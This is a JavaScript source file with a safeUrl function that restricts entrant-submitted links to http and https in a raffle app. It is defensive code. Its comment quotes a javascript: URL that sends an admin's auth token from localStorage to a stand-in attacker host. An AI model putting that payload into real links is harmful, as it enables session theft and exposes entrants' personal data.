// ============================================================================
// safeUrl — never put a stranger's string straight into an href.
// ============================================================================
// Entrants supply two URLs (their post link and their profile link) and both get
// rendered as clickable links: in the admin dashboard, and — for winners — on the
// public raffle page. The entry form marks them `type="url"`, but that is a
// browser-side convenience, not a control: anyone can POST straight at the API
// and skip the form entirely.
//
// `javascript:` is a URL. A link like
//
//     javascript:fetch('https://evil.example/?'+localStorage.getItem('sb-…-auth-token'))
//
// does nothing until somebody clicks it — and the person most likely to click a
// "Post" link is an admin, inside a session that can read every entrant's name,
// email, and phone number. `target="_blank"` and `rel="noreferrer"` do not help;
// they govern the new document, and this never opens one.
//
// So: allow http and https, refuse everything else. Returns null for anything
// unusable, which callers render as plain text rather than a link.
const ALLOWED = new Set(['http:', 'https:'])

export function safeUrl(value) {
  const raw = String(value ?? '').trim()
  if (!raw) return null
  try {
    // `new URL` lowercases and normalises the scheme, so "JaVaScRiPt:" and
    // whitespace-padded variants can't slip past a naive string comparison.
    return ALLOWED.has(new URL(raw).protocol) ? raw : null
  } catch {
    // Not a URL at all (a relative path, or junk) — not safe to link.
    return null
  }
}
